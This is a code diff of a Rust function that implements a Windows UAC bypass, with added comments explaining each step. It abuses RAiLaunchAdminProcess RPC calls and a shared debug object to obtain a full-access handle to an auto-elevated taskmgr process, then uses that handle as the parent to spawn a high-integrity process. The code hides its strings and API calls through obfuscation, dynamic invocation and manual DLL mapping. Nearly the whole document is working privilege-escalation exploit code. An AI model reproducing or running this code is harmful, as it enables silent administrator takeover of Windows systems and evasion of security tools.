@@ -13,11 +13,14 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
 {
     unsafe
     {
+
         let unelevated = lc!("c:\\windows\\system32\\notepad.exe");
         let elevated = lc!("c:\\windows\\system32\\taskmgr.exe");
+        // We dynamically get ntdll and kernel32 base addresses.
         let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
         let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
         let rpc_stub = get_rpc_stub();
+        // The C++ dll is decoded and manually mapped in runtime.
         let decoded_stub = hex::decode(rpc_stub).expect(&lc!("[x] Decoding failed"));
         let mapped_stub = manualmap::manually_map_module(decoded_stub.as_ptr()).unwrap();
  
@@ -35,13 +38,15 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let startup_info: *mut APP_STARTUP_INFO = std::mem::transmute(&APP_STARTUP_INFO::default());
         let process_information: *mut APP_PROCESS_INFORMATION = std::mem::transmute(&APP_PROCESS_INFORMATION::default());
         let returned: *mut i32 = std::mem::transmute(&i32::default());
+        
+        // First RPC to RAiLaunAdminProcess. This will spawn an uneleated Notepad process in debug mode. 
         dinvoke::dynamic_invoke!(mapped_stub.1,&lc!("Proc0_RAiLaunchAdminProcess"),rai_launch_admin_process_ptr,rai_launch_admin_process_r,ptr::null_mut(),
         path.as_ptr() as *mut u16,path.as_ptr() as *mut u16,admin,flags,current_directory.as_ptr() as *mut u16,winstation.as_ptr() as *mut u16,startup_info,
         0,-1,process_information,returned); 
 
         if rai_launch_admin_process_r.unwrap() != 0
         {
-            println!("{}", lc!("[x] RPC call to RAiLaunchAdminProcess failed."));
+            println!("{}", lc!("[x] RPC to RAiLaunchAdminProcess failed."));
             return false;
         }
 
@@ -51,6 +56,8 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let debug_object = HANDLE::default();
         let dbg_ptr: PVOID = std::mem::transmute(&debug_object);
         let _unused: *mut u32 = std::mem::transmute(&u32::default());
+
+        // We obtain a reference to the debug object stored on the TEB of the RPC server thread that have spawned the Notepad process.
         let ntstatus = dinvoke::nt_query_information_process(unelevated_handle, PROCESS_DEBUG_OBJECT_HANDLE,
             dbg_ptr, size_of::<HANDLE>() as u32, _unused);
 
@@ -74,6 +81,8 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
 
         let nt_remove_process_debug: data::NtRemoveProcessDebug;
         let nt_remove_process_debug_r: Option<i32>;
+        // We detach the debug object, so it wont get more events coming from the unelevated process. However, the object is already created and it will
+        // be reused to debug any other process that the same thread in the RPC server spawns.
         dinvoke::dynamic_invoke!(ntdll,&lc!("NtRemoveProcessDebug"),nt_remove_process_debug,nt_remove_process_debug_r,unelevated_handle,debug_object);
 
         if nt_remove_process_debug_r.unwrap() != 0
@@ -97,6 +106,9 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let startup_info: *mut APP_STARTUP_INFO = std::mem::transmute(&APP_STARTUP_INFO::default());
         let process_information: *mut APP_PROCESS_INFORMATION = std::mem::transmute(&APP_PROCESS_INFORMATION::default());
         let returned: *mut i32 = std::mem::transmute(&i32::default());
+        
+        // The second RPC to RAiLaunchAdminProcess uses an auto elevated binary like taskmgr to spawn an elevated process without UAC dialog.
+        // This process will be spawned in debug mode and will share the same debug object previously created.
         dinvoke::dynamic_invoke!(mapped_stub.1,&lc!("Proc0_RAiLaunchAdminProcess"),rai_launch_admin_process_ptr,rai_launch_admin_process_r,ptr::null_mut(),
         path.as_ptr() as *mut u16,path.as_ptr() as *mut u16,admin,flags,current_directory.as_ptr() as *mut u16,winstation.as_ptr() as *mut u16,startup_info,
         0,-1,process_information,returned); 
@@ -114,6 +126,8 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let _timeout = vec![0u8;size_of::<LARGE_INTEGER>()];
         let timeout: *mut LARGE_INTEGER = std::mem::transmute(_timeout.as_ptr());
         let wait_state_change: PVOID = std::mem::transmute(&DBGUI_WAIT_STATE_CHANGE::default());
+
+        // Since we have a reference to the debug object, we can obtain the initial process creation debug event of the elevated process.
         dinvoke::dynamic_invoke!(ntdll,&lc!("NtWaitForDebugEvent"),nt_wait_for_debug,nt_wait_for_debug_r,debug_object,0,timeout,wait_state_change);
 
         if nt_wait_for_debug_r.unwrap() != 0
@@ -130,6 +144,9 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let current_process_handle = HANDLE {0: -1};
         let _handle = HANDLE::default();
         let duplicated_handle: *mut HANDLE = std::mem::transmute(&_handle);
+
+        // The handle obtained from the initial process creation debug event does not have full access permission over the elevated process.
+        // However, we can abuse the Duplicate Handles permission to obtain a full access handle.
         let x = dinvoke::nt_duplicate_object(
             (*elevated_process_handles).process_handle,
             current_process_handle,
@@ -168,7 +185,8 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
             return false;
         }
 
-
+        // Once we have a full access handle to the elevated taskmgr process, we can set it as parent process handle at the time of spawning our new process.
+        // This way we complete the UAC bypass and we are able to spawn a process with high integrity and full administrator privileges.
         let initialize_attribute_list: data::InitializeProcThreadAttributeList;
         let _initialize_attribute_list_r: Option<BOOL>;
         let size: *mut usize = std::mem::transmute(&usize::default());
